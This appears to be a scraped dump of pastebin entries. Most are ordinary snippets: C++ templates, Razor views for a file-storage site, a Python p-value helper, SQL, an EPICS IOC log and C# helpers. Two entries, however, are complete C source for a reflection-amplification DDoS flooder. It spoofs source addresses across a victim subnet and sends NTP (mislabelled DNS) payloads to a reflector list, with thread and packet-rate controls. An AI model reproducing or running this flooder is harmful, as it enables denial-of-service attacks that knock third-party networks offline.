		udph->source = htons((rand() % (64511 - 1024 + 1)) + 1024);
	}
    iph->saddr = sins[sn_i].sin_addr.s_addr;
    list_node = list_node->next;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
    sn_i++;
    if (sn_i >= td->num_ips) {
      sn_i = 0;
    }
  }
}

/*
Function : extractIpOctets
Arguments : 
1) sourceString - String pointer that contains ip address
2) ipAddress - Target variable short type array pointer that will store ip address octets
*/
void extractIpOctets(unsigned char* sourceString, short* ipAddress)
{
    unsigned short len = 0;
    unsigned char oct[4] = { 0 }, cnt = 0, cnt1 = 0, i, buf[5];

    len = strlen(sourceString);
    for (i = 0; i < len; i++) {
        if (sourceString[i] != '.') {
            buf[cnt++] = sourceString[i];
        }
        if (sourceString[i] == '.' || i == len - 1) {
            buf[cnt] = '\0';
            cnt = 0;
            oct[cnt1++] = atoi(buf);
        }
    }
    ipAddress[0] = oct[0];
    ipAddress[1] = oct[1];
    ipAddress[2] = oct[2];
    ipAddress[3] = oct[3];
}



// ip_str ip2str(const ip_address) {
//   ip_str ip_string;
//   snprintf(ip_string, 16, ""%d.%d.%d.%d"", ip_address.octets[0], ip_address.octets[1], ip_address.octets[2], ip_address.octets[3]);
//   return ip_string;
// }

unsigned int ip2ui(char *ip)
{
	/* An IP consists of four ranges. */
	long ipAsUInt = 0;
	/* Deal with first range. */
	char *cPtr = strtok(ip, ""."");
	if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, 3);

	/* Proceed with the remaining ones. */
	int exponent = 2;
	while(cPtr && exponent >= 0)
	{
		cPtr = strtok(NULL, "".\0"");
		if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, exponent--);
	}

	return ipAsUInt;
}

char *ui2ip(unsigned int ipAsUInt)
{
	char *ip = malloc(16*sizeof(char));
	int exponent;
	for(exponent = 3; exponent >= 0; --exponent)
	{
		int r = ipAsUInt / pow(256, exponent);
		char buf[4];
		sprintf(buf, ""%d"", r);
		strcat(ip, buf);
		strcat(ip, ""."");
		ipAsUInt -= r*pow(256, exponent);
	}
	/* Replace last dot with '\0'. */
	ip[strlen(ip)-1] = 0;
	return ip;
}

unsigned int createBitmask(const char *bitmask)
{
	unsigned int times = (unsigned int)atol(bitmask)-1, i, bitmaskAsUInt = 1;
	/* Fill in set bits (1) from the right. */
	for(i=0; i<times; ++i)
	{
		bitmaskAsUInt <<= 1;
		bitmaskAsUInt |= 1;
	}
	/* Shift in unset bits from the right. */
	for(i=0; i<32-times-1; ++i)
		bitmaskAsUInt <<= 1;
	return bitmaskAsUInt;
}

// Print Program Usage Instructions
void print_usage(char *prog_name) {
  fprintf(stdout, ""Usage: %s <target IP> <port, 0 for random> <reflectors list> <threads> <pps limiter, -1 for no limit> <time>\nMethods by @yfork - Licensed to Nxver\n"", prog_name);
  return;
}

int main(int argc, char *argv[]) {
  char *prog_name = argv[0];
  if (argc < 6) {
    print_usage(prog_name);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, ""Loading list to buffer\n"");
  int max_len = 512;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  tehport = atoi(argv[2]);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], ""r"");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
        (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(buffer);
        head->next = head;
        head->prev = head;
      } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->prev = head;
        new_node->next = head->next;
        head->next = new_node;
      }
      i++;
    } else {
      continue;
    }
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  //Custom subnet attack code
  char *ip, *bitmask;
  ip = strtok(argv[1], ""/""); // Get IP before the CIDR ""/""
  if(!ip) fatal(prog_name);
	bitmask = strtok(NULL, ""\0""); // Get the subnet 
	if(!bitmask) fatal(prog_name);
  unsigned int ipAsUInt = ip2ui(ip);
  unsigned int mask_bits = (unsigned int)atol(bitmask);
	unsigned int bitmaskAsUInt = createBitmask(bitmask);
  char *networkAddress = ui2ip(ipAsUInt & bitmaskAsUInt),
		 *broadcastAddress = ui2ip(ipAsUInt | ~bitmaskAsUInt);
  unsigned long num_ips = 1;
  for (i = 32; i > mask_bits; i--) {
    num_ips *= 2;
  }
  printf(""IP range spans from %s to %s (Network and broadcast addresses inclusive). Mask is %u bits. Using %lu IPs.\n"", networkAddress, broadcastAddress, mask_bits, num_ips);
  struct sockaddr_in *sins = malloc(num_ips*sizeof(struct sockaddr_in)); //Allocate memory for address storage
  short network_octets[4], broadcast_octets[4];
  /* Get the octet values from both the network and broadcast addresses, 
  to be used as minimum and maximum IPs for the range. */
  extractIpOctets(networkAddress, network_octets);
  extractIpOctets(broadcastAddress, broadcast_octets);
  int ips = 0;
  // printf(""Generated IPs:\n"");
  for (int a = network_octets[0]; a <= broadcast_octets[0]; a++) {
    for (int b = network_octets[1]; b <= broadcast_octets[1]; b++) {
      for (int c = network_octets[2]; c <= broadcast_octets[2]; c++) {
        for (int d = network_octets[3]; d <= broadcast_octets[3]; d++) {
          sins[ips].sin_family = AF_INET;
          char ipAddr[16]; //String for the currently generating IP
          snprintf(ipAddr, 16, ""%d.%d.%d.%d"", a, b, c, d); //Format the IP string from the individual octets
          sins[ips].sin_addr.s_addr = inet_addr(ipAddr); //Set the IP address as the packet source address for this socket
          ips++;
          // printf(""%d: %s\n"", ips, ipAddr);
        }
      }
    }
  }
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sins = sins;
    td[i].num_ips = num_ips;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, ""Yeeting\n"");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}
"
28rVMLFB,ebo_helper,TrainIT,C++,Tuesday 27th of June 2023 11:46:44 AM CDT,"template<typename T, int Idx = 0, bool UseEbo = !std::is_final_v<T> && std::is_empty_v<T>>
struct ebo_helper;

template<typename T, int Idx>
struct ebo_helper<T, Idx, true> : private T {
  template<typename U>
  constexpr explicit ebo_helper(U&& t) : T{std::forward<U>(t)} {}
  constexpr T& get() { return *this; }
};

template<typename T, int Idx>
struct ebo_helper<T, Idx, false> {
  template<typename U>
  constexpr explicit ebo_helper(U&& t) : t_{std::forward<U>(t)} {}
  constexpr T& get() { return t_; }
private:
  T t_;
};"
BY3hr1H8,Untitled,MadCortez,HTML,Tuesday 27th of June 2023 11:33:37 AM CDT,"@{
    ViewData[""Title""] = ""Home Page"";
}

@model IEnumerable<MyCloud.ViewModels.Account.UserViewModel>
@if (User.Identity.IsAuthenticated && User.IsInRole(""Admin""))
{
        <table class=""table"">
            <tr><th>Имя</th><th>Почта</th><th>Права</th><th>Действия</th></tr>
        @foreach (var item in Model)
        {
                    <tr>
                        <td>@item.Name</td>
                        <td>@item.Mail</td>
                        <td>@item.Role</td>
                        <td>
                            <a asp-action=""DeleteUser"" asp-controller=""Account"" method=""post"" asp-route-id=""@item.Id"" asp-route-name=""@item.Name"">Удалить</a>
                        </td>
                    </tr>
        }
        </table>
}"
3JB1U7Tg,Untitled,MadCortez,HTML,Tuesday 27th of June 2023 11:31:27 AM CDT,"@model MyCloud.ViewModels.Account.LoginViewModel

@{
    Layout = ""_Layout"";
    ViewBag.Title = ""Вход в аккаунт"";
}

<div style=""padding: 40px;""></div>

<div class=""container py-5"">
    <div class=""row"">
        <div class=""col-md-12"">
            <div class=""row justify-content-center"">
                <div class=""col-md-10"">
                    <span class=""anchor""></span>
                    <div class=""card card-account card-outline-secondary border border-white"">
                        <div class=""card-header"">
                            <h3 class=""mb-0 text-center ParagraphHome"">Вход в аккаунт</h3>
                        </div>
                        <div class=""card-body"">
                            <form autocomplete=""on"" method=""post"" asp-controller=""Account"" asp-action=""Login"">
                                <div asp-validation-summary=""All"" class=""text-danger text-center""></div>
                                <div class=""form-group"">
                                    <input asp-for=""Name"" placeholder=""Логин"" class=""form-control textbox-dg font-weight-bold text-center"" type=""text"">
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <input autocomplete=""new-password"" asp-for=""Password"" placeholder=""Пароль"" class=""form-control textbox-dg font-weight-bold text-center"" type=""password"">
                                </div>
                                <br />
                                <div class=""d-grid gap-2 d-md-block float-right"">
                                    <button class=""btn btn-success btn-lg float-right"" style=""margin:0 auto; display:block"">Войти</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>"
U1p9Xa2V,Untitled,RageSpamQuit,Python,Tuesday 27th of June 2023 11:29:59 AM CDT,"def pvalue_to_sigma(p_value):
    # Calculate the z-score (number of standard deviations from the mean)
    z_score = norm.ppf(1 - p_value/2)  # Divide p-value by 2 for a two-tailed test
    
    # Calculate the sigma level of confidence
    sigma_level = abs(z_score)
    
    return sigma_level

sigma_level = pvalue_to_sigma(p)
print(f""Sigma level of confidence: {sigma_level}"")"
0NrNt8i8,Untitled,MadCortez,HTML,Tuesday 27th of June 2023 11:29:51 AM CDT,"@model MyCloud.ViewModels.Account.RegisterViewModel

@{
    Layout = ""_Layout"";
    ViewBag.Title = ""Регистрация"";
}

<div style=""padding: 20px;""></div>

<div class=""container py-5"">
    <div class=""row"">
        <div class=""col-md-12"">
            <div class=""row justify-content-center"">
                <div class=""col-md-10"">
                    <span class=""anchor""></span>
                    <div class=""card card-account card-outline-secondary border border-white"">
                        <div class=""card-header"">
                            <h3 class=""mb-0 text-center paragraphHome text-black"">Регистрация</h3>
                        </div>
                        <div class=""card-body"">
                            <form asp-controller=""Account"" asp-action=""Register"">
                                <div asp-validation-summary=""All"" class=""text-danger text-center""></div>
                                <div class=""form-group"">
                                    <input asp-for=""Name"" class=""form-control textbox-dg font-weight-bold text-center"" placeholder=""Имя"" type=""text"">
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <input asp-for=""Mail"" class=""form-control textbox-dg font-weight-bold text-center"" placeholder=""Почта"" type=""email"">
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <input autocomplete=""new-password"" asp-for=""Password"" placeholder=""Пароль"" class=""form-control textbox-dg font-weight-bold text-center"" type=""password"">
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <input autocomplete=""new-password"" asp-for=""PasswordConfirm"" placeholder=""Подтвердите пароль"" class=""form-control textbox-dg font-weight-bold text-center"" type=""password"">
                                </div>
                                <br />
                                <button class=""btn btn-success btn-lg float-right"" type=""submit"" style=""margin:0 auto; display:block"">Регистрация</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>"
22L0QyQL,Untitled,MadCortez,HTML,Tuesday 27th of June 2023 11:26:52 AM CDT,"@{
    ViewData[""Title""] = ""Home Page"";
}

@model IEnumerable<MyCloud.Models.FileData>
@if (User.Identity.IsAuthenticated)
{
    <form asp-action=""UploadFile"" asp-controller=""Home"" method=""post"" enctype=""multipart/form-data"">
        <input type=""file"" name=""uploadedFile"" /><br>
        <input type=""submit"" value=""Загрузить"" />
    </form>
    <table class=""table"">
        <tr><th>Имя файла</th><th>Размер файла</th><th>Дата загрузки</th><th>Действия</th></tr>
        @foreach (var item in Model)
        {
            <tr>
                <td>@item.FileName</td>
                <td>@item.Weight</td>
                <td>@item.CreateDate</td>
                <td>
                    <a asp-action=""DownloadFile"" asp-controller=""Home"" method=""get"" asp-route-filename=""@item.FileName"">Скачать</a>
                    <a asp-action=""DeleteFile"" asp-controller=""Home"" method=""get"" asp-route-filename=""@item.FileName"">Удалить</a>
                </td>
            </tr>
        }
    </table>
}
"
v6Hfq7yy,Untitled,jeffysonr,PostgreSQL,Tuesday 27th of June 2023 11:25:24 AM CDT,"INSERT INTO tb_movimento (descricao,data_passo,usuario_id,data_previsao,hora_passo,data_cadastro,passo,notificado,protocolo_id,setor_destino_id,setor_origem_id,usuario_destino_id,sigiloso,passo_workflow,motivo_id,exibe_descricao_ambiente_profissional)
select 
	'correção ultimo passo' as descricao,
	current_date as data_passo,
	'admin' as usuario_id,
	x.data_previsao,
	x.hora_passo,
	current_date as data_cadastro,
	(x.passo+1) as passo,
	x.notificado,
	x.protocolo_id,
	x.setor_destino_id,
	x.setor_origem_id,
	x.usuario_destino_id,
	x.sigiloso,
	x.passo_workflow,
	x.motivo_id,
	x.exibe_descricao_ambiente_profissional
from (
	select 
		p.movimento_id, m.*  
	from tb_protocolo p
		inner join (
			select max(m.id) as mov_id, max(passo) as passo, m.protocolo_id from tb_movimento m group by m.protocolo_id	
		) as um on um.protocolo_id = p.id
		inner join tb_movimento m on m.protocolo_id = p.id and m.passo = um.passo
) as x
where x.movimento_id <> x.id"
RYtzztaV,Урок 3 конструкторы для продвинутых,kutuzzzov,C++,Tuesday 27th of June 2023 11:23:29 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <string>
#include <vector>
#include <set>

using namespace std;

class RouteManager {
public:
    void AddRoute(int start, int finish) {
        reachable_lists_[start].insert(finish);
        reachable_lists_[finish].insert(start);
    }
    int FindNearestFinish(int start, int finish) const {
        int result = abs(start - finish);
        if (reachable_lists_.count(start) < 1) {
            return result;
        }
        const set<int>& reachable_stations = reachable_lists_.at(start);
        if (!reachable_stations.empty()) {
            const auto it = reachable_stations.lower_bound(finish);
            if (it == reachable_stations.begin()) {
                return min(result, abs(finish - *it));
            }
            const auto prev_it = std::prev(it);
            if (it == reachable_stations.end() || abs(finish - *prev_it) <= abs(finish - *it)) {
                return min(result, abs(finish - *prev_it));
            }
            else {
                return min(result, abs(*it - finish));
            }
        }
        return result;
    }

private:
    map<int, set<int>> reachable_lists_;
};

int main() {
    RouteManager routes;

    int query_count;
    cin >> query_count;

    for (int query_id = 0; query_id < query_count; ++query_id) {
        string query_type;
        cin >> query_type;
        int start, finish;
        cin >> start >> finish;
        if (query_type == ""ADD""s) {
            routes.AddRoute(start, finish);
        } else if (query_type == ""GO""s) {
            cout << routes.FindNearestFinish(start, finish) << ""\n""s;
        }
    }
}"
ZmqBE1gW,Untitled,GregLeblanc,Bash,Tuesday 27th of June 2023 11:12:30 AM CDT,"#!../../bin/linux-x86_64/PCU50_300test
###############################################################################
# Set up environment
< envPaths
epicsEnvSet(""IOC"",""iocPCU50_300test"")
epicsEnvSet(""TOP"",""/home/leblanc/EPICS/PCU50-300"")
epicsEnvSet(""EPICS_BASE"",""/home/leblanc/EPICS/epics-base"")
epicsEnvSet(""SUPPORT"",""/home/leblanc/EPICS/support"")
epicsEnvSet(""ASYN"",""/home/leblanc/EPICS/support/asyn"")
epicsEnvSet(""CALC"",""/home/leblanc/EPICS/support/calc"")
epicsEnvSet(""STREAM"",""/home/leblanc/EPICS/support/StreamDevice"")
epicsEnvSet ""STREAM_PROTOCOL_PATH"" ""/home/leblanc/EPICS/PCU50-300/db""
###############################################################################
# Allow PV name prefixes and serial port name to be set from the environment
epicsEnvSet ""P"" ""PCU50_300""
epicsEnvSet ""R"" ""test""
#epicsEnvSet ""HOST"" ""$(HOST=10.0.0.105)""
#epicsEnvSet ""PORT"" ""$(PORT=5025)""
###############################################################################
## Register all support components
cd ""/home/leblanc/EPICS/PCU50-300""
dbLoadDatabase ""dbd/PCU50_300test.dbd""
PCU50_300test_registerRecordDeviceDriver pdbbase
###############################################################################
# Set up ASYN ports
#drvAsynIPPortConfigure(""LAN0"",""$(HOST):$(PORT)"",0,0,0)
#1st argument is the port's name
#2nd argument is the ""IP address: port num""
#3rd argument is priority; 0 means medium
#4th argument is noAutoConnect; 0 means yes, autoconnect
#5th argument is noProcessEOS; 0 something complicated, 1 also complicated
drvAsynSerialPortConfigure(""USB0"",""/dev/ttyUSB0"",0,0,0)
asynSetOption(""USB0"",-1,""baud"",""9600"")
asynSetOption(""USB0"",-1,""bits"",""8"")
asynSetOption(""USB0"",-1,""parity"",""none"")
asynSetOption(""USB0"",-1,""stop"",""2"")
# Set output and input end of command terminators to be newlines.
asynOctetSetOutputEos(""USB0"", 0, ""\n"")
asynOctetSetInputEos(""USB0"", 0, ""\n"")
###############################################################################
asynSetTraceIOMask(""USB0"", 0, ""ESCAPE"")
asynSetTraceMask(""USB0"", 0, ""ERROR|DRIVER"")
var streamError 1
var streamDebug 1
var streamDebugColored 1
var streamErrorDeadTime 30
var streamMsgTimeStamped 1
streamSetLogfile(""logfile.txt"")
###############################################################################
## Load record instances
dbLoadRecords(""db/devPCU50_300.db"",""P=PCU50_300,R=test,PORT=USB0,A=0"")
###############################################################################
## Start EPICS
cd ""/home/leblanc/EPICS/PCU50-300/iocBoot/iocPCU50_300test""
iocInit
Starting iocInit
############################################################################
## EPICS R7.0.7.1-DEV
## Rev. R7.0.7-112-g216359974c97b26ed9e8
## Rev. Date Git: 2023-04-18 13:11:59 -0500
############################################################################
2023/06/27 10:31:29.269 /dev/ttyUSB0 write 5
AD 0\n
iocRun: All initialization complete
2023/06/27 10:31:29.287 /dev/ttyUSB0 read 8
000000\n\r
2023/06/27 10:31:29.288 /dev/ttyUSB0 write 7
DA 0,0\n
2023/06/27 10:31:29.288 /dev/ttyUSB0 write 4
S1H\n
2023/06/27 10:31:29.303 /dev/ttyUSB0 read 5
00000
2023/06/27 10:31:29.319 /dev/ttyUSB0 read 10
0\n\r08000\n\r
2023/06/27 10:31:29.320 /dev/ttyUSB0 write 6
*IDN?\n
2023/06/27 10:31:29.335 /dev/ttyUSB0 read 6
PCU 50
2023/06/27 10:31:29.351 /dev/ttyUSB0 read 6
-300\n\r
2023/06/27 10:31:29.352 /dev/ttyUSB0 write 6
*IDN?\n
2023/06/27 10:31:29.367 /dev/ttyUSB0 read 6
PCU 50
2023/06/27 10:31:29.383 /dev/ttyUSB0 read 6
-300\n\r
2023/06/27 10:31:29.384 /dev/ttyUSB0 write 5
AD 0\n
2023/06/27 10:31:29.399 /dev/ttyUSB0 read 7
000000\n
epics> 2023/06/27 10:31:38.767 /dev/ttyUSB0 read 1
\r
2023/06/27 10:31:38.767 /dev/ttyUSB0 write 4
S1H\n
2023/06/27 10:31:38.775 /dev/ttyUSB0 read 1
4
2023/06/27 10:31:38.791 /dev/ttyUSB0 read 7
08000\n\r
exit"
eXua5X7C,Untitled,MadCortez,C#,Tuesday 27th of June 2023 11:11:07 AM CDT,"using MimeKit;
using MailKit.Net.Smtp;

namespace MyCloud.Helpers
{
    public static class MailHelper
    {
        public static async Task SendEmail(string email, string subject, string message)
        {
            using var emailMessage = new MimeMessage();

            emailMessage.From.Add(new MailboxAddress(""Администрация сайта"", """"));
            emailMessage.To.Add(new MailboxAddress("""", email));
            emailMessage.Subject = subject;
            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Plain)
            {
                Text = message
            };

            using (var client = new SmtpClient())
            {
                await client.ConnectAsync(""smtp.mail.ru"", 465, true);
                await client.AuthenticateAsync("""", """");
                await client.SendAsync(emailMessage);

                await client.DisconnectAsync(true);
            }
        }
    }
}
"
dZiLP49A,Untitled,MadCortez,C#,Tuesday 27th of June 2023 11:10:31 AM CDT,"using System.Security.Cryptography;
using System.Text;

namespace MyCloud.Helpers
{
    public static class HashPasswordHelper
    {
        public static string HashPassowrd(string password)
        {
            using (var sha256 = SHA256.Create())
            {
                var hashedBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
                var hash = BitConverter.ToString(hashedBytes).Replace(""-"", """").ToLower();

                return hash;
            }
        }
    }
}
"
P6chZkRG,ntp.c,NullRout3d,C,Tuesday 27th of June 2023 11:10:21 AM CDT,"/*--------------------------------------------------*\
|  UDP (Default DNS) amplification against subnets.  |
|  Adapted by @Lupoii (Telegram) - 2021.             |
\*--------------------------------------------------*/
//    gcc -pthread dns.c -o dns -lm   // 
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <math.h>

static const char PAYLOAD[] =
    /* using ANY ""sl"" at the moment */
    ""\x17\x00\x03\x2a\x00\x00\x00\x00"";
static unsigned int DPORT = 123;

// Phenomite template begin
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

struct list {
  struct sockaddr_in data;
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in *sins;
  unsigned long num_ips;
};

void print_usage(char *);

void fatal(char *prog_name)
{
	print_usage(prog_name);
	exit(EXIT_FAILURE);
}

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
  iph->id = htonl(61337);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr(""127.0.0.1"");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(61337);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
  udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in *sins = td->sins;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, ""Could not open raw socket.\n"");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(tehport);
  iph->saddr = sins[0].sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, ""Error: setsockopt() - Cannot set HDRINCL!\n"");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  int sn_i = 0;
  while (1) {
	if (tehport < 1){
		udph->source = htons((rand() % (64511 - 1024 + 1)) + 1024);
	}
    iph->saddr = sins[sn_i].sin_addr.s_addr;
    list_node = list_node->next;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
    sn_i++;
    if (sn_i >= td->num_ips) {
      sn_i = 0;
    }
  }
}

/*
Function : extractIpOctets
Arguments : 
1) sourceString - String pointer that contains ip address
2) ipAddress - Target variable short type array pointer that will store ip address octets
*/
void extractIpOctets(unsigned char* sourceString, short* ipAddress)
{
    unsigned short len = 0;
    unsigned char oct[4] = { 0 }, cnt = 0, cnt1 = 0, i, buf[5];

    len = strlen(sourceString);
    for (i = 0; i < len; i++) {
        if (sourceString[i] != '.') {
            buf[cnt++] = sourceString[i];
        }
        if (sourceString[i] == '.' || i == len - 1) {
            buf[cnt] = '\0';
            cnt = 0;
            oct[cnt1++] = atoi(buf);
        }
    }
    ipAddress[0] = oct[0];
    ipAddress[1] = oct[1];
    ipAddress[2] = oct[2];
    ipAddress[3] = oct[3];
}



// ip_str ip2str(const ip_address) {
//   ip_str ip_string;
//   snprintf(ip_string, 16, ""%d.%d.%d.%d"", ip_address.octets[0], ip_address.octets[1], ip_address.octets[2], ip_address.octets[3]);
//   return ip_string;
// }

unsigned int ip2ui(char *ip)
{
	/* An IP consists of four ranges. */
	long ipAsUInt = 0;
	/* Deal with first range. */
	char *cPtr = strtok(ip, ""."");
	if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, 3);

	/* Proceed with the remaining ones. */
	int exponent = 2;
	while(cPtr && exponent >= 0)
	{
		cPtr = strtok(NULL, "".\0"");
		if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, exponent--);
	}

	return ipAsUInt;
}

char *ui2ip(unsigned int ipAsUInt)
{
	char *ip = malloc(16*sizeof(char));
	int exponent;
	for(exponent = 3; exponent >= 0; --exponent)
	{
		int r = ipAsUInt / pow(256, exponent);
		char buf[4];
		sprintf(buf, ""%d"", r);
		strcat(ip, buf);
		strcat(ip, ""."");
		ipAsUInt -= r*pow(256, exponent);
	}
	/* Replace last dot with '\0'. */
	ip[strlen(ip)-1] = 0;
	return ip;
}

unsigned int createBitmask(const char *bitmask)
{
	unsigned int times = (unsigned int)atol(bitmask)-1, i, bitmaskAsUInt = 1;
	/* Fill in set bits (1) from the right. */
	for(i=0; i<times; ++i)
	{
		bitmaskAsUInt <<= 1;
		bitmaskAsUInt |= 1;
	}
	/* Shift in unset bits from the right. */
	for(i=0; i<32-times-1; ++i)
		bitmaskAsUInt <<= 1;
	return bitmaskAsUInt;
}

// Print Program Usage Instructions
void print_usage(char *prog_name) {
  fprintf(stdout, ""Usage: %s <target IP> <port, 0 for random> <reflectors list> <threads> <pps limiter, -1 for no limit> <time>\nMethods by @yfork - Licensed to Nxver\n"", prog_name);
  return;
}

int main(int argc, char *argv[]) {
  char *prog_name = argv[0];
  if (argc < 6) {
    print_usage(prog_name);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, ""Loading list to buffer\n"");
  int max_len = 512;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  tehport = atoi(argv[2]);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], ""r"");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
        (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(buffer);
        head->next = head;
        head->prev = head;
      } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->prev = head;
        new_node->next = head->next;
        head->next = new_node;
      }
      i++;
    } else {
      continue;
    }
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  //Custom subnet attack code
  char *ip, *bitmask;
  ip = strtok(argv[1], ""/""); // Get IP before the CIDR ""/""
  if(!ip) fatal(prog_name);
	bitmask = strtok(NULL, ""\0""); // Get the subnet 
	if(!bitmask) fatal(prog_name);
  unsigned int ipAsUInt = ip2ui(ip);
  unsigned int mask_bits = (unsigned int)atol(bitmask);
	unsigned int bitmaskAsUInt = createBitmask(bitmask);
  char *networkAddress = ui2ip(ipAsUInt & bitmaskAsUInt),
		 *broadcastAddress = ui2ip(ipAsUInt | ~bitmaskAsUInt);
  unsigned long num_ips = 1;
  for (i = 32; i > mask_bits; i--) {
    num_ips *= 2;
  }
  printf(""IP range spans from %s to %s (Network and broadcast addresses inclusive). Mask is %u bits. Using %lu IPs.\n"", networkAddress, broadcastAddress, mask_bits, num_ips);
  struct sockaddr_in *sins = malloc(num_ips*sizeof(struct sockaddr_in)); //Allocate memory for address storage
  short network_octets[4], broadcast_octets[4];
